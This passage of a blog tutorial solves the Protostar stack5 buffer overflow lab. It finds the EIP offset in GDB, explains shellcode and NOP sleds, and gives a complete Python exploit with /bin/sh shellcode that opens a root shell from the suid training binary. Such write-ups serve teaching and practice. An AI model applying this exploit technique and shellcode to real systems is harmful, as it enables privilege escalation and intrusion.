<h4 id="if-we-type-x24wx-esp-it-will-show-us-x-24-24wx-words-at-the-top-of-the-stack-esp">If we type <code class="highlighter-rouge">x/24wx $esp</code> it will show us (<code class="highlighter-rouge">x/</code>) 24 (<code class="highlighter-rouge">24wx</code>) words at the top of the stack (<code class="highlighter-rouge">$esp</code>).</h4>
<p><code class="highlighter-rouge">x/24wx $esp</code>
<img src="/images/binary-exploitation/BOF5/10.png" alt="" /></p>
<h4 id="at-the-second-line-we-see-this-address-0xbffff730-and-it-holds-values-of-0x41414141-and-we-already-know-that-41-is-the-hex-of-a-which-was-our-input-to-the-program-so-we-know-that-this-address-is-where-the-buffer-starts-we-know-that-the-buffer-comes-first-then-the-eip-so-the-eips-address-is-greater-than-the-buffers-address-we-will-substract-them-from-each-other">At the second line we see this address <code class="highlighter-rouge">0xbffff730</code> and it holds values of <code class="highlighter-rouge">0x41414141</code> and we already know that 41 is the hex of “A” which was our input to the program so we know that this address is where the buffer starts. We know that the buffer comes first then the EIP so the EIP’s address is greater than the buffer’s address. We will substract them from each other:</h4>
<p><code class="highlighter-rouge">p/d 0xbffff77c - 0xbffff730</code>
<img src="/images/binary-exploitation/BOF5/11.png" alt="" /></p>
<h4 id="and-we-get-76--the-same-result-we-got-using-metasploit-that-was-another-practical-way-to-find-the-buffers-size">And we get 76 , the same result we got using metasploit. That was another practical way to find the buffer’s size.</h4>
<p><br /></p>
<hr />

<h3 id="idea-of-the-exploit">Idea of the exploit</h3>
<h4 id="before-we-build-our-exploit-lets-just-understand-the-idea-of-the-exploit-we-will-fill-the-buffer-with-a-as-always--we-will-reach-the-eip-and-overwrite-it-with-a-new-address-that-points-to-our-shell-code-4-bytes-after-then-we-will-add-something-called-nop-no-operation--then-finally-the-shellcode-lets-breakdown-everything">before we build our exploit let’s just understand the idea of the exploit. we will fill the buffer with “A” as always , we will reach the EIP and overwrite it with a new address that points to our shell code (4 bytes after), then we will add something called NOP (No Operation) , then finally the shellcode. Let’s breakdown everything.</h4>
<p><br /></p>
<hr />

<h3 id="shellcode">ShellCode</h3>
<h4 id="so-whats-a-shellcode--simply-its-a-piece-of-code-written-in-hex-in-our-situation-that-we-use-as-a-payload-to-execute-something--binsh-for-example-and-this-binary-is-suid--so-if-we-execute-shellcode-that-executes-binsh-with-the-binary-we-will-get-a-root-shell">So what’s a shellcode ? Simply it’s a piece of code (“written in hex in our situation”) that we use as a payload to execute something . <code class="highlighter-rouge">/bin/sh</code> for example. And this binary is suid … so if we execute shellcode that executes <code class="highlighter-rouge">/bin/sh</code> with the binary we will get a root shell.</h4>
<h4 id="you-can-get-shellcodes-from-shell-storm-or-from-exploit-db--of-course-there-are-a-lot-of-other-resources--im-just-giving-examples">You can get shellcodes from <a href="http://shell-storm.org/shellcode/">shell-storm</a> or from <a href="https://www.exploit-db.com/">exploit-db</a> , of course there are a lot of other resources , I’m just giving examples.</h4>
<h4 id="this-is-the-shellcode-we-are-going-to-use-for-this-challenge-">This is the <a href="https://www.exploit-db.com/exploits/13357">shellcode</a> we are going to use for this challenge :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
</code></pre></div></div>
<h4 id="this-shellcode-executes-binsh">This shellcode executes <code class="highlighter-rouge">/bin/sh</code></h4>
<p><br /></p>
<hr />

<h3 id="nop-no-operation">NOP (No Operation)</h3>
<h4 id="basically-no-operation-is-used-to-make-sure-that-our-exploit-doesnt-fail--because-we-wont-always-point-to-the-right-address--so-we-add-stuff-that-doesnt-do-anything-and-we-point-to-them--then-when-the-program-executes-it-will-reach-those-nops-and-keeps-executing-them-does-nothing-until-it-reaches-the-shellcode">Basically no operation is used to make sure that our exploit doesn’t fail , because we won’t always point to the right address , so we add stuff that doesn’t do anything and we point to them , Then when the program executes it will reach those NOPs and keeps executing them (does nothing) until it reaches the shellcode.</h4>
<p><br /></p>
<hr />

<h3 id="building-the-exploit">Building the exploit</h3>
<h4 id="in-the-last-challenges-a-single-python-print-statement-solved-it-this-time-it-will-be-a-mess-so-we-will-create-a-small-exploit-with-python">In the last challenges a single python print statement solved it. This time it will be a mess so we will create a small exploit with python.</h4>
<h4 id="first-thing-we-will-import-a-module-called-struct--i-will-explain-why-in-a-moment">First thing we will import a module called struct , I will explain why in a moment.</h4>
<p><code class="highlighter-rouge">import struct</code></p>
<h4 id="then-we-will-create-a-variable-the-holds-the-padding-the-chars-to-fill-the-buffer">Then we will create a variable the holds the padding (the chars to fill the buffer)</h4>
<p><code class="highlighter-rouge">pad = "\x41" * 76</code></p>
<h4 id="after-it-fills-the-buffer-it-will-hit-the-eip--we-need-the-new-eip-address-that-we-will-assign--as-i-said-above-we-need-it-to-be-the-address-of-the-following-instruction-4-bytes-after-the-original-eip-address-so-it-will-be-0xbffff77c--4--google-can-simply-give-you-the-answer-d--it-will-be-0xbffff780--we-will-add-that-value-to-a-variable-but-remember-we-need-it-in-reverse--thats-why-struct-is-important-if-you-do-import-structstructpacki--0xbffff780-from-the-python-interpreter-it-will-print-x80xf7xffxbf--it-makes-life-easier-d">After it fills the buffer it will hit the EIP , we need the new EIP address that we will assign , as I said above we need it to be the address of the following instruction (4 bytes after the original EIP address) so it will be <code class="highlighter-rouge">0xbffff77c + 4</code> , google can simply give you the answer :D . it will be <code class="highlighter-rouge">0xbffff780</code> . We will add that value to a variable but remember we need it in reverse , That’s why struct is important. if you do <code class="highlighter-rouge">import struct;struct.pack("I" , 0xbffff780)</code> from the python interpreter it will print <code class="highlighter-rouge">\x80\xf7\xff\xbf</code> , it makes life easier :D</h4>
<p><code class="highlighter-rouge">EIP = struct.pack("I", 0xbffff780)</code></p>
<h4 id="then-comes-our-shellcode">Then comes our shellcode</h4>
<p><code class="highlighter-rouge">shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"</code></p>
<h4 id="last-thing-is-the-nop--it-can-be-anything--so-100-chars-will-be-good">Last thing is the NOP , it can be anything , so 100 chars will be good</h4>
<p><code class="highlighter-rouge">NOP = "\x90" * 100</code></p>
<h4 id="ok-our-exploit-is-ready--we-just-need-to-print-out-the-final-payload-so-">Ok our exploit is ready , we just need to print out the final payload so :</h4>
<p><code class="highlighter-rouge">print pad + EIP + NOP + shellcode</code></p>
<h4 id="lets-take-a-look-at-the-script-">Let’s take a look at the script :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import struct
pad = "\x41" * 76
EIP = struct.pack("I", 0xbffff780)
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
NOP = "\x90" * 100
print pad + EIP + NOP + shellcode
</code></pre></div></div>
<p><img src="/images/binary-exploitation/BOF5/12.png" alt="" /></p>
<hr />

<h3 id="applying-the-exploit">Applying the exploit</h3>
<h4 id="now-its-show-time--lets-test-it-out">Now it’s show time ! let’s test it out.</h4>
<p><code class="highlighter-rouge"> python /tmp/stack5.py | ./stack5</code>
<img src="/images/binary-exploitation/BOF5/13.png" alt="" /></p>
<h4 id="and-we-got-a-root-shell-">And we got a root shell !</h4>
<p><br />
<br /></p>
<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
<h4 id="dont-forget-to-read-the-previous-articles--tweet-about-the-article-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous articles</a> , Tweet about the article if you liked it , follow on twitter for awesome resources <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
<h4 id="thanks-for-reading">Thanks for reading.</h4>
<p><br />
<br /></p>
<h4 id="previous-buffer-overflow-article--buffer-overflow-practical-examples--exploiting-eip---protostar-stack4">Previous Buffer Overflow article : <a href="/binary-exploitation/bof4/">Buffer Overflow Practical Examples , Exploiting EIP - protostar stack4</a></h4>
<hr />


  </div>
<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/binary-exploitation/bof5/" hidden></a>
</article>


      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">0xRick Owned Root !</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">0xRick Owned Root !</li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>

